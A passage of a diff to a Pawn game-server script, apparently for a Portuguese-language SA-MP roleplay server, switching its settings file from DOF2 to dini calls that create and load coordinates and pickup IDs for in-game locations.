-  		DOF2_SetString(ficheiro, "NewsMusica6Alterador", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica1Nome", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica2Nome", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica3Nome", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica4Nome", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica5Nome", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica6Nome", "Unused");
-		DOF2_SetFloat(ficheiro, "AeroportoX", 0);
-		DOF2_SetFloat(ficheiro, "AeroportoY", 0);
-		DOF2_SetFloat(ficheiro, "AeroportoZ", 0);
-		DOF2_SetInt(ficheiro, "AeroportoVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "AeroportoInterior", 0);
-		DOF2_SetInt(ficheiro, "AeroportoPickupID", 1239);
-		DOF2_SetFloat(ficheiro, "ComprarIscoX", 0);
-		DOF2_SetFloat(ficheiro, "ComprarIscoY", 0);
-		DOF2_SetFloat(ficheiro, "ComprarIscoZ", 0);
-		DOF2_SetInt(ficheiro, "ComprarIscoVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "ComprarIscoInterior", 0);
-        DOF2_SetInt(ficheiro, "ComprarIscoPickupID", 1274);
-		DOF2_SetFloat(ficheiro, "LotaX", 0);
-		DOF2_SetFloat(ficheiro, "LotaY", 0);
-		DOF2_SetFloat(ficheiro, "LotaZ", 0);
-		DOF2_SetInt(ficheiro, "LotaVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "LotaInterior", 0);
-        DOF2_SetInt(ficheiro, "LotaPickupID", 1600);
-		DOF2_SetFloat(ficheiro, "FabricaX", 0);
-		DOF2_SetFloat(ficheiro, "FabricaY", 0);
-		DOF2_SetFloat(ficheiro, "FabricaZ", 0);
-		DOF2_SetInt(ficheiro, "FabricaVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "FabricaInterior", 0);
-        DOF2_SetInt(ficheiro, "FabricaPickupID", 1274);
-		
-		DOF2_SaveFile();
+	if(!dini_Exists(ficheiro))
+	{
+		dini_Create(ficheiro);
+
+		dini_IntSet(ficheiro, "RegistoCounter", 0);
+		dini_FloatSet(ficheiro, "LicX", 0);
+		dini_FloatSet(ficheiro, "LicY", 0);
+		dini_FloatSet(ficheiro, "LicZ", 0);
+		dini_IntSet(ficheiro, "LicPickupID", 1239);
+		dini_IntSet(ficheiro, "LicVirtualWorld", 0);
+		dini_IntSet(ficheiro, "LicInterior", 0);
+		dini_FloatSet(ficheiro, "EmpregoX", 0);
+		dini_FloatSet(ficheiro, "EmpregoY", 0);
+		dini_FloatSet(ficheiro, "EmpregoZ", 0);
+		dini_IntSet(ficheiro, "EmpregoPickupID", 1239);
+		dini_IntSet(ficheiro, "EmpregoVirtualWorld", 0);
+		dini_IntSet(ficheiro, "EmpregoInterior", 0);
+		dini_FloatSet(ficheiro, "PrenderX", 0);
+		dini_FloatSet(ficheiro, "PrenderY", 0);
+		dini_FloatSet(ficheiro, "PrenderZ", 0);
+		dini_IntSet(ficheiro, "PrenderVirtualWorld", 0);
+		dini_IntSet(ficheiro, "PrenderInterior", 0);
+		dini_IntSet(ficheiro, "Impostos", 0);
+		dini_IntSet(ficheiro, "FundoDesemprego", 0);
+		dini_FloatSet(ficheiro, "ComprarDrogasX", 0);
+		dini_FloatSet(ficheiro, "ComprarDrogasY", 0);
+		dini_FloatSet(ficheiro, "ComprarDrogasZ", 0);
+		dini_IntSet(ficheiro, "ComprarDrogasVirtualWorld", 0);
+		dini_IntSet(ficheiro, "ComprarDrogasInterior", 0);
+		dini_FloatSet(ficheiro, "ComprarMateriaisX", 0);
+		dini_FloatSet(ficheiro, "ComprarMateriaisY", 0);
+		dini_FloatSet(ficheiro, "ComprarMateriaisZ", 0);
+		dini_IntSet(ficheiro, "ComprarMateriaisVirtualWorld", 0);
+		dini_IntSet(ficheiro, "ComprarMateriaisInterior", 0);
+		dini_FloatSet(ficheiro, "EntregarDrogasX", 0);
+		dini_FloatSet(ficheiro, "EntregarDrogasY", 0);
+		dini_FloatSet(ficheiro, "EntregarDrogasZ", 0);
+		dini_IntSet(ficheiro, "EntregarDrogasVirtualWorld", 0);
+		dini_IntSet(ficheiro, "EntregarDrogasInterior", 0);
+		dini_FloatSet(ficheiro, "EntregarMateriaisX", 0);
+		dini_FloatSet(ficheiro, "EntregarMateriaisY", 0);
+		dini_FloatSet(ficheiro, "EntregarMateriaisZ", 0);
+		dini_IntSet(ficheiro, "EntregarMateriaisVirtualWorld", 0);
+		dini_IntSet(ficheiro, "EntregarMateriaisInterior", 0);
+		dini_FloatSet(ficheiro, "TunningX", 0);
+		dini_FloatSet(ficheiro, "TunningY", 0);
+		dini_FloatSet(ficheiro, "TunningZ", 0);
+		dini_IntSet(ficheiro, "TunningVirtualWorld", 0);
+		dini_IntSet(ficheiro, "TunningInterior", 0);
+		dini_IntSet(ficheiro, "TunningPickupID", 1239);
+		dini_FloatSet(ficheiro, "Banco1X", 0);
+		dini_FloatSet(ficheiro, "Banco1Y", 0);
+		dini_FloatSet(ficheiro, "Banco1Z", 0);
+		dini_IntSet(ficheiro, "Banco1PickupID", 1239);
+		dini_IntSet(ficheiro, "Banco1VirtualWorld", 0);
+		dini_IntSet(ficheiro, "Banco1Interior", 0);
+		dini_FloatSet(ficheiro, "Banco2X", 0);
+		dini_FloatSet(ficheiro, "Banco2Y", 0);
+		dini_FloatSet(ficheiro, "Banco2Z", 0);
+		dini_IntSet(ficheiro, "Banco2VirtualWorld", 0);
+		dini_IntSet(ficheiro, "Banco2Interior", 0);
+        dini_IntSet(ficheiro, "Banco2PickupID", 1239);
+        dini_IntSet(ficheiro, "PrecoAtestarG", 1);
+		dini_FloatSet(ficheiro, "PoliciaX", 0);
+		dini_FloatSet(ficheiro, "PoliciaY", 0);
+		dini_FloatSet(ficheiro, "PoliciaZ", 0);
+		dini_IntSet(ficheiro, "PoliciaVirtualWorld", 0);
+		dini_IntSet(ficheiro, "PoliciaInterior", 0);
+		dini_IntSet(ficheiro, "PoliciaPickupID", 1239);
+		dini_FloatSet(ficheiro, "ApreendidosX", 2329.2659);
+		dini_FloatSet(ficheiro, "ApreendidosY", 2445.7922);
+		dini_FloatSet(ficheiro, "ApreendidosZ", 4.4461);
+		dini_FloatSet(ficheiro, "ApreendidosA", 85.0567);
+		dini_IntSet(ficheiro, "ApreendidosVirtualWorld", 1);
+		dini_IntSet(ficheiro, "ApreendidosInterior", 0);
+		dini_FloatSet(ficheiro, "EntradaApreendidosX", 0);
+		dini_FloatSet(ficheiro, "EntradaApreendidosY", 0);
+		dini_FloatSet(ficheiro, "EntradaApreendidosZ", 0);
+		dini_FloatSet(ficheiro, "EntradaApreendidosA", 0);
+		dini_IntSet(ficheiro, "EntradaApreendidosVirtualWorld", 0);
+		dini_IntSet(ficheiro, "EntradaApreendidosInterior", 0);
+		dini_FloatSet(ficheiro, "VenderVeiculoX", 0);
+		dini_FloatSet(ficheiro, "VenderVeiculoY", 0);
+		dini_FloatSet(ficheiro, "VenderVeiculoZ", 0);
+		dini_FloatSet(ficheiro, "CamaraMunicipalX", 0);
+		dini_FloatSet(ficheiro, "CamaraMunicipalY", 0);
+		dini_FloatSet(ficheiro, "CamaraMunicipalZ", 0);
+		dini_IntSet(ficheiro, "CamaraMunicipalVirtualWorld", 0);
+		dini_IntSet(ficheiro, "CamaraMunicipalInterior", 0);
+		dini_IntSet(ficheiro, "CamaraMunicipalPickupID", 1239);
+  		dini_Set(ficheiro, "NewsMusica1", "Unused");
+  		dini_Set(ficheiro, "NewsMusica2", "Unused");
+  		dini_Set(ficheiro, "NewsMusica3", "Unused");
+  		dini_Set(ficheiro, "NewsMusica4", "Unused");
+  		dini_Set(ficheiro, "NewsMusica5", "Unused");
+  		dini_Set(ficheiro, "NewsMusica6", "Unused");
+  		dini_Set(ficheiro, "NewsMusica1Alterador", "Unused");
+  		dini_Set(ficheiro, "NewsMusica2Alterador", "Unused");
+  		dini_Set(ficheiro, "NewsMusica3Alterador", "Unused");
+  		dini_Set(ficheiro, "NewsMusica4Alterador", "Unused");
+  		dini_Set(ficheiro, "NewsMusica5Alterador", "Unused");
+  		dini_Set(ficheiro, "NewsMusica6Alterador", "Unused");
+  		dini_Set(ficheiro, "NewsMusica1Nome", "Unused");
+  		dini_Set(ficheiro, "NewsMusica2Nome", "Unused");
+  		dini_Set(ficheiro, "NewsMusica3Nome", "Unused");
+  		dini_Set(ficheiro, "NewsMusica4Nome", "Unused");
+  		dini_Set(ficheiro, "NewsMusica5Nome", "Unused");
+  		dini_Set(ficheiro, "NewsMusica6Nome", "Unused");
+		dini_FloatSet(ficheiro, "AeroportoX", 0);
+		dini_FloatSet(ficheiro, "AeroportoY", 0);
+		dini_FloatSet(ficheiro, "AeroportoZ", 0);
+		dini_IntSet(ficheiro, "AeroportoVirtualWorld", 0);
+		dini_IntSet(ficheiro, "AeroportoInterior", 0);
+		dini_IntSet(ficheiro, "AeroportoPickupID", 1239);
+		dini_FloatSet(ficheiro, "ComprarIscoX", 0);
+		dini_FloatSet(ficheiro, "ComprarIscoY", 0);
+		dini_FloatSet(ficheiro, "ComprarIscoZ", 0);
+		dini_IntSet(ficheiro, "ComprarIscoVirtualWorld", 0);
+		dini_IntSet(ficheiro, "ComprarIscoInterior", 0);
+        dini_IntSet(ficheiro, "ComprarIscoPickupID", 1274);
+		dini_FloatSet(ficheiro, "LotaX", 0);
+		dini_FloatSet(ficheiro, "LotaY", 0);
+		dini_FloatSet(ficheiro, "LotaZ", 0);
+		dini_IntSet(ficheiro, "LotaVirtualWorld", 0);
+		dini_IntSet(ficheiro, "LotaInterior", 0);
+        dini_IntSet(ficheiro, "LotaPickupID", 1600);
+		dini_FloatSet(ficheiro, "FabricaX", 0);
+		dini_FloatSet(ficheiro, "FabricaY", 0);
+		dini_FloatSet(ficheiro, "FabricaZ", 0);
+		dini_IntSet(ficheiro, "FabricaVirtualWorld", 0);
+		dini_IntSet(ficheiro, "FabricaInterior", 0);
+        dini_IntSet(ficheiro, "FabricaPickupID", 1274);
 	}
 	else
 	{
- 		oInfo[0][RegistoCounter] = DOF2_GetInt(ficheiro, "RegistoCounter");
-		oInfo[0][LicX] = DOF2_GetFloat(ficheiro, "LicX");
-		oInfo[0][LicY] = DOF2_GetFloat(ficheiro, "LicY");
-		oInfo[0][LicZ] = DOF2_GetFloat(ficheiro, "LicZ");
-		oInfo[0][LicPickupID] = DOF2_GetInt(ficheiro, "LicPickupID");
-		oInfo[0][LicVirtualWorld] = DOF2_GetInt(ficheiro, "LicVirtualWorld");
-		oInfo[0][LicInterior] = DOF2_GetInt(ficheiro, "LicInterior");
- 		oInfo[0][EmpregoX] = DOF2_GetFloat(ficheiro, "EmpregoX");
-		oInfo[0][EmpregoY] = DOF2_GetFloat(ficheiro, "EmpregoY");
-		oInfo[0][EmpregoZ] = DOF2_GetFloat(ficheiro, "EmpregoZ");
-		oInfo[0][EmpregoPickupID] = DOF2_GetInt(ficheiro, "EmpregoPickupID");
-		oInfo[0][EmpregoVirtualWorld] = DOF2_GetInt(ficheiro, "EmpregoVirtualWorld");
-		oInfo[0][EmpregoInterior] = DOF2_GetInt(ficheiro, "EmpregoInterior");
- 		oInfo[0][PrenderX] = DOF2_GetFloat(ficheiro, "PrenderX");
-		oInfo[0][PrenderY] = DOF2_GetFloat(ficheiro, "PrenderY");
-		oInfo[0][PrenderZ] = DOF2_GetFloat(ficheiro, "PrenderZ");
-		oInfo[0][PrenderVirtualWorld] = DOF2_GetInt(ficheiro, "PrenderVirtualWorld");
-		oInfo[0][PrenderInterior] = DOF2_GetInt(ficheiro, "PrenderInterior");
-		oInfo[0][Impostos] = DOF2_GetInt(ficheiro, "Impostos");
-		oInfo[0][FundoDesemprego] = DOF2_GetInt(ficheiro, "FundoDesemprego");
- 		oInfo[0][ComprarDrogasX] = DOF2_GetFloat(ficheiro, "ComprarDrogasX");
-		oInfo[0][ComprarDrogasY] = DOF2_GetFloat(ficheiro, "ComprarDrogasY");
-		oInfo[0][ComprarDrogasZ] = DOF2_GetFloat(ficheiro, "ComprarDrogasZ");
-		oInfo[0][PrenderVirtualWorld] = DOF2_GetInt(ficheiro, "ComprarDrogasVirtualWorld");
-		oInfo[0][PrenderInterior] = DOF2_GetInt(ficheiro, "ComprarDrogasInterior");
- 		oInfo[0][ComprarMateriaisX] = DOF2_GetFloat(ficheiro, "ComprarMateriaisX");
-		oInfo[0][ComprarMateriaisY] = DOF2_GetFloat(ficheiro, "ComprarMateriaisY");
-		oInfo[0][ComprarMateriaisZ] = DOF2_GetFloat(ficheiro, "ComprarMateriaisZ");
-		oInfo[0][ComprarMateriaisVirtualWorld] = DOF2_GetInt(ficheiro, "ComprarMateriaisVirtualWorld");
-		oInfo[0][ComprarMateriaisInterior] = DOF2_GetInt(ficheiro, "ComprarMateriaisInterior");
-  		oInfo[0][EntregarDrogasX] = DOF2_GetFloat(ficheiro, "EntregarDrogasX");
-		oInfo[0][EntregarDrogasY] = DOF2_GetFloat(ficheiro, "EntregarDrogasY");
-		oInfo[0][EntregarDrogasZ] = DOF2_GetFloat(ficheiro, "EntregarDrogasZ");
-		oInfo[0][EntregarDrogasVirtualWorld] = DOF2_GetInt(ficheiro, "EntregarDrogasVirtualWorld");
-		oInfo[0][EntregarDrogasInterior] = DOF2_GetInt(ficheiro, "EntregarDrogasInterior");
-   		oInfo[0][EntregarMateriaisX] = DOF2_GetFloat(ficheiro, "EntregarMateriaisX");
-		oInfo[0][EntregarMateriaisY] = DOF2_GetFloat(ficheiro, "EntregarMateriaisY");
-		oInfo[0][EntregarMateriaisZ] = DOF2_GetFloat(ficheiro, "EntregarMateriaisZ");
-		oInfo[0][EntregarMateriaisVirtualWorld] = DOF2_GetInt(ficheiro, "EntregarMateriaisVirtualWorld");
-		oInfo[0][EntregarMateriaisInterior] = DOF2_GetInt(ficheiro, "EntregarMateriaisInterior");
-  		oInfo[0][TunningX] = DOF2_GetFloat(ficheiro, "TunningX");
-		oInfo[0][TunningY] = DOF2_GetFloat(ficheiro, "TunningY");
-		oInfo[0][TunningZ] = DOF2_GetFloat(ficheiro, "TunningZ");
-		oInfo[0][TunningVirtualWorld] = DOF2_GetInt(ficheiro, "TunningVirtualWorld");
-		oInfo[0][TunningInterior] = DOF2_GetInt(ficheiro, "TunningInterior");
-		oInfo[0][TunningPickupID] = DOF2_GetInt(ficheiro, "TunningPickupID");
-  		oInfo[0][Banco1X] = DOF2_GetFloat(ficheiro, "Banco1X");
-		oInfo[0][Banco1Y] = DOF2_GetFloat(ficheiro, "Banco1Y");
-		oInfo[0][Banco1Z] = DOF2_GetFloat(ficheiro, "Banco1Z");
-		oInfo[0][Banco1VirtualWorld] = DOF2_GetInt(ficheiro, "Banco1VirtualWorld");
-		oInfo[0][Banco1Interior] = DOF2_GetInt(ficheiro, "Banco1Interior");
-		oInfo[0][Banco1PickupID] = DOF2_GetInt(ficheiro, "Banco1PickupID");
-   		oInfo[0][Banco2X] = DOF2_GetFloat(ficheiro, "Banco2X");
-		oInfo[0][Banco2Y] = DOF2_GetFloat(ficheiro, "Banco2Y");
-		oInfo[0][Banco2Z] = DOF2_GetFloat(ficheiro, "Banco2Z");
-		oInfo[0][Banco2VirtualWorld] = DOF2_GetInt(ficheiro, "Banco2VirtualWorld");
-		oInfo[0][Banco2Interior] = DOF2_GetInt(ficheiro, "Banco2Interior");
-        oInfo[0][Banco2PickupID] = DOF2_GetInt(ficheiro, "Banco2PickupID");
-        oInfo[0][PrecoAtestarG] = DOF2_GetInt(ficheiro, "PrecoAtestarG");
-  		oInfo[0][PoliciaX] = DOF2_GetFloat(ficheiro, "PoliciaX");
-		oInfo[0][PoliciaY] = DOF2_GetFloat(ficheiro, "PoliciaY");
-		oInfo[0][PoliciaZ] = DOF2_GetFloat(ficheiro, "PoliciaZ");
-		oInfo[0][PoliciaVirtualWorld] = DOF2_GetInt(ficheiro, "PoliciaVirtualWorld");
-		oInfo[0][PoliciaInterior] = DOF2_GetInt(ficheiro, "PoliciaInterior");
-		oInfo[0][PoliciaPickupID] = DOF2_GetInt(ficheiro, "PoliciaPickupID");
-  		oInfo[0][ApreendidosX] = DOF2_GetFloat(ficheiro, "ApreendidosX");
-		oInfo[0][ApreendidosY] = DOF2_GetFloat(ficheiro, "ApreendidosY");
-		oInfo[0][ApreendidosZ] = DOF2_GetFloat(ficheiro, "ApreendidosZ");
-		oInfo[0][ApreendidosA] = DOF2_GetFloat(ficheiro, "ApreendidosA");
-		oInfo[0][ApreendidosVirtualWorld] = DOF2_GetInt(ficheiro, "ApreendidosVirtualWorld");
-		oInfo[0][ApreendidosInterior] = DOF2_GetInt(ficheiro, "ApreendidosInterior");
-  		oInfo[0][EntradaApreendidosX] = DOF2_GetFloat(ficheiro, "EntradaApreendidosX");
-		oInfo[0][EntradaApreendidosY] = DOF2_GetFloat(ficheiro, "EntradaApreendidosY");
-		oInfo[0][EntradaApreendidosZ] = DOF2_GetFloat(ficheiro, "EntradaApreendidosZ");
-		oInfo[0][EntradaApreendidosA] = DOF2_GetFloat(ficheiro, "EntradaApreendidosA");
-		oInfo[0][EntradaApreendidosVirtualWorld] = DOF2_GetInt(ficheiro, "EntradaApreendidosVirtualWorld");
-		oInfo[0][EntradaApreendidosInterior] = DOF2_GetInt(ficheiro, "EntradaApreendidosInterior");
-  		oInfo[0][VenderVeiculoX] = DOF2_GetFloat(ficheiro, "VenderVeiculoX");
-		oInfo[0][VenderVeiculoY] = DOF2_GetFloat(ficheiro, "VenderVeiculoY");
-		oInfo[0][VenderVeiculoZ] = DOF2_GetFloat(ficheiro, "VenderVeiculoZ");
-		oInfo[0][CamaraMunicipalX] = DOF2_GetFloat(ficheiro, "CamaraMunicipalX");
-		oInfo[0][CamaraMunicipalY] = DOF2_GetFloat(ficheiro, "CamaraMunicipalY");
-		oInfo[0][CamaraMunicipalZ] = DOF2_GetFloat(ficheiro, "CamaraMunicipalZ");
-		oInfo[0][CamaraMunicipalVirtualWorld] = DOF2_GetInt(ficheiro, "CamaraMunicipalVirtualWorld");
-		oInfo[0][CamaraMunicipalInterior] = DOF2_GetInt(ficheiro, "CamaraMunicipalInterior");
-		oInfo[0][CamaraMunicipalPickupID] = DOF2_GetInt(ficheiro, "CamaraMunicipalPickupID");
-		format(oInfo[0][NewsMusica1], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica1"));
-		format(oInfo[0][NewsMusica2], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica2"));
-		format(oInfo[0][NewsMusica3], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica3"));
-		format(oInfo[0][NewsMusica4], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica4"));
-		format(oInfo[0][NewsMusica5], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica5"));
-		format(oInfo[0][NewsMusica6], 128, "%s", DOF2_GetString(ficheiro, "NewsMusica6"));
- 		format(oInfo[0][NewsMusica1Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica1Alterador"));
-		format(oInfo[0][NewsMusica2Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica2Alterador"));
-		format(oInfo[0][NewsMusica3Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica3Alterador"));
-		format(oInfo[0][NewsMusica4Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica4Alterador"));
-		format(oInfo[0][NewsMusica5Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica5Alterador"));
-		format(oInfo[0][NewsMusica6Alterador], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica6Alterador"));
- 		format(oInfo[0][NewsMusica1Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica1Nome"));
-		format(oInfo[0][NewsMusica2Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica2Nome"));
-		format(oInfo[0][NewsMusica3Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica3Nome"));
-		format(oInfo[0][NewsMusica4Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica4Nome"));
-		format(oInfo[0][NewsMusica5Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica5Nome"));
-		format(oInfo[0][NewsMusica6Nome], 32, "%s", DOF2_GetString(ficheiro, "NewsMusica6Nome"));
-		oInfo[0][ImpostoCarros] = DOF2_GetInt(ficheiro, "ImpostoCarros");
-		oInfo[0][ImpostoCasas] = DOF2_GetInt(ficheiro, "ImpostoCasas");
-		oInfo[0][ImpostoLojas] = DOF2_GetInt(ficheiro, "ImpostoLojas");
-		oInfo[0][AeroportoX] = DOF2_GetFloat(ficheiro, "AeroportoX");
-		oInfo[0][AeroportoY] = DOF2_GetFloat(ficheiro, "AeroportoY");
-		oInfo[0][AeroportoZ] = DOF2_GetFloat(ficheiro, "AeroportoZ");
-		oInfo[0][AeroportoVirtualWorld] = DOF2_GetInt(ficheiro, "AeroportoVirtualWorld");
-		oInfo[0][AeroportoInterior] = DOF2_GetInt(ficheiro, "AeroportoInterior");
-		oInfo[0][AeroportoPickupID] = DOF2_GetInt(ficheiro, "AeroportoPickupID");
-   		oInfo[0][ComprarIscoX] = DOF2_GetFloat(ficheiro, "ComprarIscoX");
-		oInfo[0][ComprarIscoY] = DOF2_GetFloat(ficheiro, "ComprarIscoY");
-		oInfo[0][ComprarIscoZ] = DOF2_GetFloat(ficheiro, "ComprarIscoZ");
-		oInfo[0][ComprarIscoVirtualWorld] = DOF2_GetInt(ficheiro, "ComprarIscoVirtualWorld");
-		oInfo[0][ComprarIscoInterior] = DOF2_GetInt(ficheiro, "ComprarIscoInterior");
-        oInfo[0][ComprarIscoPickupID] = DOF2_GetInt(ficheiro, "ComprarIscoPickupID");
-   		oInfo[0][LotaX] = DOF2_GetFloat(ficheiro, "LotaX");
-		oInfo[0][LotaY] = DOF2_GetFloat(ficheiro, "LotaY");
-		oInfo[0][LotaZ] = DOF2_GetFloat(ficheiro, "LotaZ");
-		oInfo[0][LotaVirtualWorld] = DOF2_GetInt(ficheiro, "LotaVirtualWorld");
-		oInfo[0][LotaInterior] = DOF2_GetInt(ficheiro, "LotaInterior");
-        oInfo[0][LotaPickupID] = DOF2_GetInt(ficheiro, "LotaPickupID");
-   		oInfo[0][FabricaX] = DOF2_GetFloat(ficheiro, "FabricaX");
-		oInfo[0][FabricaY] = DOF2_GetFloat(ficheiro, "FabricaY");
-		oInfo[0][FabricaZ] = DOF2_GetFloat(ficheiro, "FabricaZ");
-		oInfo[0][FabricaVirtualWorld] = DOF2_GetInt(ficheiro, "FabricaVirtualWorld");
-		oInfo[0][FabricaInterior] = DOF2_GetInt(ficheiro, "FabricaInterior");
-        oInfo[0][FabricaPickupID] = DOF2_GetInt(ficheiro, "FabricaPickupID");
-		
+ 		oInfo[0][RegistoCounter] = dini_Int(ficheiro, "RegistoCounter");
+		oInfo[0][LicX] = dini_Float(ficheiro, "LicX");
+		oInfo[0][LicY] = dini_Float(ficheiro, "LicY");
+		oInfo[0][LicZ] = dini_Float(ficheiro, "LicZ");
+		oInfo[0][LicPickupID] = dini_Int(ficheiro, "LicPickupID");
+		oInfo[0][LicVirtualWorld] = dini_Int(ficheiro, "LicVirtualWorld");
+		oInfo[0][LicInterior] = dini_Int(ficheiro, "LicInterior");
+ 		oInfo[0][EmpregoX] = dini_Float(ficheiro, "EmpregoX");
+		oInfo[0][EmpregoY] = dini_Float(ficheiro, "EmpregoY");
+		oInfo[0][EmpregoZ] = dini_Float(ficheiro, "EmpregoZ");
+		oInfo[0][EmpregoPickupID] = dini_Int(ficheiro, "EmpregoPickupID");
+		oInfo[0][EmpregoVirtualWorld] = dini_Int(ficheiro, "EmpregoVirtualWorld");
+		oInfo[0][EmpregoInterior] = dini_Int(ficheiro, "EmpregoInterior");
+ 		oInfo[0][PrenderX] = dini_Float(ficheiro, "PrenderX");
+		oInfo[0][PrenderY] = dini_Float(ficheiro, "PrenderY");
+		oInfo[0][PrenderZ] = dini_Float(ficheiro, "PrenderZ");
+		oInfo[0][PrenderVirtualWorld] = dini_Int(ficheiro, "PrenderVirtualWorld");
+		oInfo[0][PrenderInterior] = dini_Int(ficheiro, "PrenderInterior");
+		oInfo[0][Impostos] = dini_Int(ficheiro, "Impostos");
+		oInfo[0][FundoDesemprego] = dini_Int(ficheiro, "FundoDesemprego");
+ 		oInfo[0][ComprarDrogasX] = dini_Float(ficheiro, "ComprarDrogasX");
+		oInfo[0][ComprarDrogasY] = dini_Float(ficheiro, "ComprarDrogasY");
+		oInfo[0][ComprarDrogasZ] = dini_Float(ficheiro, "ComprarDrogasZ");
+		oInfo[0][PrenderVirtualWorld] = dini_Int(ficheiro, "ComprarDrogasVirtualWorld");
+		oInfo[0][PrenderInterior] = dini_Int(ficheiro, "ComprarDrogasInterior");
+ 		oInfo[0][ComprarMateriaisX] = dini_Float(ficheiro, "ComprarMateriaisX");
+		oInfo[0][ComprarMateriaisY] = dini_Float(ficheiro, "ComprarMateriaisY");
+		oInfo[0][ComprarMateriaisZ] = dini_Float(ficheiro, "ComprarMateriaisZ");
+		oInfo[0][ComprarMateriaisVirtualWorld] = dini_Int(ficheiro, "ComprarMateriaisVirtualWorld");
+		oInfo[0][ComprarMateriaisInterior] = dini_Int(ficheiro, "ComprarMateriaisInterior");
+  		oInfo[0][EntregarDrogasX] = dini_Float(ficheiro, "EntregarDrogasX");
+		oInfo[0][EntregarDrogasY] = dini_Float(ficheiro, "EntregarDrogasY");
+		oInfo[0][EntregarDrogasZ] = dini_Float(ficheiro, "EntregarDrogasZ");
+		oInfo[0][EntregarDrogasVirtualWorld] = dini_Int(ficheiro, "EntregarDrogasVirtualWorld");
+		oInfo[0][EntregarDrogasInterior] = dini_Int(ficheiro, "EntregarDrogasInterior");
+   		oInfo[0][EntregarMateriaisX] = dini_Float(ficheiro, "EntregarMateriaisX");
+		oInfo[0][EntregarMateriaisY] = dini_Float(ficheiro, "EntregarMateriaisY");
+		oInfo[0][EntregarMateriaisZ] = dini_Float(ficheiro, "EntregarMateriaisZ");
+		oInfo[0][EntregarMateriaisVirtualWorld] = dini_Int(ficheiro, "EntregarMateriaisVirtualWorld");
+		oInfo[0][EntregarMateriaisInterior] = dini_Int(ficheiro, "EntregarMateriaisInterior");
+  		oInfo[0][TunningX] = dini_Float(ficheiro, "TunningX");
+		oInfo[0][TunningY] = dini_Float(ficheiro, "TunningY");
+		oInfo[0][TunningZ] = dini_Float(ficheiro, "TunningZ");
+		oInfo[0][TunningVirtualWorld] = dini_Int(ficheiro, "TunningVirtualWorld");
+		oInfo[0][TunningInterior] = dini_Int(ficheiro, "TunningInterior");
+		oInfo[0][TunningPickupID] = dini_Int(ficheiro, "TunningPickupID");
+  		oInfo[0][Banco1X] = dini_Float(ficheiro, "Banco1X");
+		oInfo[0][Banco1Y] = dini_Float(ficheiro, "Banco1Y");
+		oInfo[0][Banco1Z] = dini_Float(ficheiro, "Banco1Z");
+		oInfo[0][Banco1VirtualWorld] = dini_Int(ficheiro, "Banco1VirtualWorld");
+		oInfo[0][Banco1Interior] = dini_Int(ficheiro, "Banco1Interior");
+		oInfo[0][Banco1PickupID] = dini_Int(ficheiro, "Banco1PickupID");
+   		oInfo[0][Banco2X] = dini_Float(ficheiro, "Banco2X");
+		oInfo[0][Banco2Y] = dini_Float(ficheiro, "Banco2Y");
+		oInfo[0][Banco2Z] = dini_Float(ficheiro, "Banco2Z");
+		oInfo[0][Banco2VirtualWorld] = dini_Int(ficheiro, "Banco2VirtualWorld");
+		oInfo[0][Banco2Interior] = dini_Int(ficheiro, "Banco2Interior");
+        oInfo[0][Banco2PickupID] = dini_Int(ficheiro, "Banco2PickupID");
+        oInfo[0][PrecoAtestarG] = dini_Int(ficheiro, "PrecoAtestarG");
+  		oInfo[0][PoliciaX] = dini_Float(ficheiro, "PoliciaX");
+		oInfo[0][PoliciaY] = dini_Float(ficheiro, "PoliciaY");
+		oInfo[0][PoliciaZ] = dini_Float(ficheiro, "PoliciaZ");
+		oInfo[0][PoliciaVirtualWorld] = dini_Int(ficheiro, "PoliciaVirtualWorld");
+		oInfo[0][PoliciaInterior] = dini_Int(ficheiro, "PoliciaInterior");
+		oInfo[0][PoliciaPickupID] = dini_Int(ficheiro, "PoliciaPickupID");
+  		oInfo[0][ApreendidosX] = dini_Float(ficheiro, "ApreendidosX");
+		oInfo[0][ApreendidosY] = dini_Float(ficheiro, "ApreendidosY");
+		oInfo[0][ApreendidosZ] = dini_Float(ficheiro, "ApreendidosZ");
+		oInfo[0][ApreendidosA] = dini_Float(ficheiro, "ApreendidosA");
+		oInfo[0][ApreendidosVirtualWorld] = dini_Int(ficheiro, "ApreendidosVirtualWorld");
+		oInfo[0][ApreendidosInterior] = dini_Int(ficheiro, "ApreendidosInterior");
+  		oInfo[0][EntradaApreendidosX] = dini_Float(ficheiro, "EntradaApreendidosX");
+		oInfo[0][EntradaApreendidosY] = dini_Float(ficheiro, "EntradaApreendidosY");
+		oInfo[0][EntradaApreendidosZ] = dini_Float(ficheiro, "EntradaApreendidosZ");
+		oInfo[0][EntradaApreendidosA] = dini_Float(ficheiro, "EntradaApreendidosA");
+		oInfo[0][EntradaApreendidosVirtualWorld] = dini_Int(ficheiro, "EntradaApreendidosVirtualWorld");
+		oInfo[0][EntradaApreendidosInterior] = dini_Int(ficheiro, "EntradaApreendidosInterior");
+  		oInfo[0][VenderVeiculoX] = dini_Float(ficheiro, "VenderVeiculoX");
+		oInfo[0][VenderVeiculoY] = dini_Float(ficheiro, "VenderVeiculoY");
